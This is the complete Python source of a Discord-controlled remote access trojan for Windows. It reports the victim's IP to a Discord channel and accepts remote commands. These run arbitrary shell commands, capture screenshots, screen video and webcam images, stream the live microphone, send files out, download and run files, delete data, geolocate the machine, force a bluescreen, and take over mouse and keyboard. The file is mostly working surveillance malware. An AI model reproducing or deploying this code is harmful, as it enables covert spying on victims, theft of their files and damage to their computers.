from xmlrpc import client
import discord
import subprocess
from discord.ext import commands
import socket
import os
import webbrowser
import mss
import imageio
import time
import io
import numpy as np
from PIL import Image
import ctypes
import ctypes.wintypes
import pyautogui
import requests
import sounddevice as sd
from scipy.io.wavfile import write
import cv2
import pyaudio
import sys
from datetime import datetime

BOT_TOKEN = 'YOUR_BOT_TOKEN'  # Replace with your bot token

command = ['ss', 'sc', 'cmd', 'restart', 'shutdown', 'logoff', 'bluescreen', 'whoami', 'website', 'help', 'dir', 'chdir', 'download', 'delete', 'upload', 'run', 'join', 'leave', 'notepad', 'message', 'moveto', 'click', 'write', 'geo', 'wc', 'wcr']

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)

def current_time(seconds_also=False):
    return datetime.datetime.now().strftime('%d.%m.%Y_%H.%M' if not seconds_also else '%d.%m.%Y_%H.%M.%S')

SESSION_PREFIX = "session"

hostname = socket.gethostname()
ip = requests.get("https://api.ipify.org").text

@bot.event
async def on_ready():
    for guild in bot.guilds:
        count = 1
        while True:
            name = f"{SESSION_PREFIX}-{count}"
            existing = discord.utils.get(guild.text_channels, name=name)
            if not existing:
                break
            count += 1

        channel = await guild.create_text_channel(name)
        await channel.send(f"Client Connected, IP: {ip}")

@bot.command()
async def help(ctx):
    await ctx.send("""
.ss - take a screenshot
.sc - record screen for 5 seconds
.cmd <command> - run cmd commands
.dir - list files in current directory
.chdir <directory> - change current directory
.download <url> - download file from url
.delete <filename> - delete file from target computer
.upload <filename> - upload file from target computer
.geo - get maps location of target computer
.restart - restart computer
.run <filename> - run any file on target computer
.join - join voice channel and listen live mic audio 
.leave - leave voice channel
.shutdown - shut down computer
.logoff - log current user off
.bluescreen - bluescreen target computer
.notepad - open notepad
.message <text> - show message on target computer
.moveto - move mouse to specific coordinates
.click - click mouse at current position
.whoami - show user of computer
.website - open website
.write - write anything on target computer
.wc - take a picture with webcam
.wcr - record webcam for 5 second
.help - show these commands
""")   

@bot.command()
async def cmd(ctx, *, cmd):
    if not ctx.channel.name.startswith(SESSION_PREFIX):
        return
    try:
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
     output = result.stdout or result.stderr
     await ctx.send(f'{subprocess.getoutput(cmd)}')
     await ctx.send('Command executed')
    except:
       await ctx.send('Could not execute command')

@bot.command()
async def restart(ctx):
    try:
     os.system('shutdown /r /t 0')
     await ctx.send('Command executed')
    except:
       await ctx.send('Could not execute command')
@bot.command()
async def shutdown(ctx):
    try:
     os.system('shutdown /s /t 0')
     await ctx.send('Command executed')
    except:
       await ctx.send('Could not execute command')

@bot.command()
async def whoami(ctx):
    user = os.environ.get('USERNAME')
    await ctx.send(user)

@bot.command()
async def website(ctx, url: str):
    try:
     if not url.startswith("http"):
      url = "https://" + url
     webbrowser.open(url)
     await ctx.send('Command executed')
    except:
       await ctx.send('Could not execute Command')

@bot.command()
async def sc(ctx):
    await ctx.send("Recording..")
    frames = []

    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            start = time.time()

            while time.time() - start < 5:
                img = sct.grab(monitor)
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2RGB)
                frames.append(frame)

        buffer = io.BytesIO()
        writer = imageio.get_writer(buffer, format="mp4", fps=30)

        for f in frames:
            writer.append_data(f)

        writer.close()
        buffer.seek(0)

        file = discord.File(fp=buffer, filename="video.mp4")
        await ctx.send(file=file)

    except Exception as e:
        await ctx.send(f"Could not record: {e}")

@bot.command()
async def ss(ctx):
   try:
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

    buffer = io.BytesIO()
    img.save(buffer, format="PNG") 
    buffer.seek(0)

    file = discord.File(buffer, filename="screenshot.png")
    await ctx.send(file=file)

    buffer.close()

   except Exception as e:
    print(e)
    await ctx.send('Could not take screenshot')


@bot.command()
async def bluescreen(ctx):
   try:
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    await ctx.send('Command executed')
   except:
      await ctx.send('Could not execute command')

@bot.command()
async def logoff(ctx):
   try:
    os.system('shutdown /l /f')
    await ctx.send('Command executed')
   except:
      await ctx.send('Could not execute command')

@bot.command()
async def write(ctx, *, text: str):
   time.sleep(1)
   pyautogui.write(text, interval=0.05)
   await ctx.send('Command executed')

@bot.command()
async def notepad(ctx):
   os.system('notepad')
   await ctx.send('Command executed')

@bot.command()
async def run(ctx, filename: str):
   try:
    os.startfile(filename)
    await ctx.send('Command executed')
   except:
      await ctx.send('Could not execute command')  

@bot.command()
async def dir(ctx):
   try:
      subprocess.run('dir', shell=True, capture_output=True, text=True)
      output = subprocess.getoutput('dir')
      await ctx.send(output)
   except:
      await ctx.send('Could not execute command')

@bot.command()
async def chdir(ctx, directory: str):
    try:
     os.chdir(directory)
     await ctx.send('Command executed')
    except:
        await ctx.send('Could not execute command')

@bot.command()
async def download(ctx, url: str):
    try:
     filename = url.split("/")[-1]
     response = requests.get(url)
     with open(filename, "wb") as f:
        f.write(response.content)
        await ctx.send('Command executed')
    except:
        await ctx.send('Could not execute command')

@bot.command()
async def delete(ctx, filename: str):
    try:
     os.remove(filename)
     await ctx.send('Command executed')
    except:
        await ctx.send('Could not execute command')

@bot.command()
async def wc(ctx):
    try:
     cap = cv2.VideoCapture(0)
     ret, frame = cap.read()
     if ret:
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        img = Image.fromarray(frame)
        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        buffer.seek(0)
        file = discord.File(buffer, filename='webcam.png')
        await ctx.send(file=file)
        buffer.close()
     cap.release()
    except:
        await ctx.send('Could not access webcam')

@bot.command()
async def wcr(ctx):
    try:
     cap = cv2.VideoCapture(0)
     frames = []
     start = time.time()
     while time.time() - start < 5:
        ret, frame = cap.read()
        if ret:
            frames.append(frame)
     buffer = io.BytesIO()
     writer = imageio.get_writer(buffer, format='mp4', fps=30)
     for f in frames:
        f = cv2.cvtColor(f, cv2.COLOR_BGR2RGB)
        writer.append_data(f)
     writer.close()
     buffer.seek(0)
     file = discord.File(buffer, filename="webcam_video.mp4")
     await ctx.send(file=file)
     frames.clear()
     buffer.close()
     cap.release()
    except:
        await ctx.send('Could not access webcam')

@bot.command()
async def message(ctx, *, text: str):
    ctypes.windll.user32.MessageBoxW(0, text, "Message", 1)
    await ctx.send('Command executed')

@bot.command()
async def geo(ctx):
    try:
     response = requests.get('https://ipinfo.io/json')
     data = response.json()
     loc = data.get('loc')
     if loc:
        maps_url = f"https://www.google.com/maps?q={loc}"
        await ctx.send(f"Geolocation: {maps_url}")
     else:
        await ctx.send("Could not retrieve geolocation")
    except:
        await ctx.send('Could not retrieve geolocation')

class PyAudioPCM(discord.AudioSource):
    def __init__(self):
        self.p = pyaudio.PyAudio()
        self.chunk = 960  

        device = self.p.get_default_input_device_info()
        print("Using mic:", device["name"])

        self.rate_in = int(device["defaultSampleRate"]) 

        self.stream = self.p.open(
            format=pyaudio.paInt16,
            channels=1, 
            rate=self.rate_in,
            input=True,
            input_device_index=device["index"],
            frames_per_buffer=int(self.rate_in / 50)  
        )

    def read(self):
        try:
            data = self.stream.read(int(self.rate_in / 50), exception_on_overflow=False)

            audio = np.frombuffer(data, dtype=np.int16)

            audio = np.interp(
                np.linspace(0, len(audio), 960),
                np.arange(len(audio)),
                audio
            ).astype(np.int16)

            stereo = np.repeat(audio[:, np.newaxis], 2, axis=1).flatten()

            return stereo.tobytes()

        except Exception as e:
            print("Audio Fehler:", e)
            return b"\x00" * 3840  

    def is_opus(self):
        return False
    
@bot.command()
async def join(ctx):
    if not ctx.author.voice:
        return await ctx.send("You must be in a voice channel to use this command.")

    channel = ctx.author.voice.channel
    vc = await channel.connect(self_deaf=False)

    vc.play(PyAudioPCM())

    await ctx.send(f"[{current_time()}] Joined & streaming mic")

@bot.command()
async def leave(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("Disconnected")

@bot.command()
async def upload(ctx, filename: str):
    if not os.path.isfile(filename):
        await ctx.send("File does not exist.")
        return
    try:
        with open(filename, "rb") as f:
            file = discord.File(f, filename=filename)
            await ctx.send(file=file)
    except:
        await ctx.send("Could not upload file.")

@bot.command()
async def moveto(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await ctx.send('Command executed')
    except:
        await ctx.send('Could not execute command')

@bot.command()
async def click(ctx):
    try:
        pyautogui.click()
        await ctx.send('Command executed')
    except:
        await ctx.send('Could not execute command')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("Unknown command")
   

bot.run(BOT_TOKEN)
